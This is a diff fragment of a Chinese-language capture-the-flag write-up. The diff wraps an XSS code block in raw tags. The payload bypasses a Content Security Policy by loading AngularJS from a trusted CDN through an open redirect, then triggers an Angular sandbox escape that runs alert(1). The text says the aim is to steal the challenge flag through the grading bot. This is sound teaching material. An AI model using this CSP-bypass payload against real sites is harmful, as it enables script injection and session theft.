@@ -35,10 +35,12 @@
 还需要利用到`angular`组件，原因如下  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102348192.png)
 在重定向只会忽略路径部分，而不会忽略URL，而CSP中又恰巧信任了`https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js`  
+{% raw %}  
 ```javascript  
 氼script src=&#34;http://localhost:3000/redirect?url=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js&#34; 夾  //氼/script 夾  
 &lt;div data-ng-app&gt; {{&#39;a&#39;.constructor.prototype.charAt=[].join;$eval(&#39;x=1} } };alert(1);//&#39;);}} &lt;/div&gt;  
 ```  
+{% endraw %}  
 （这里在本地搭建了一个作为测试）  
 ![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202502102359533.png)
 根据`bot.ts`来盗取`flag`  
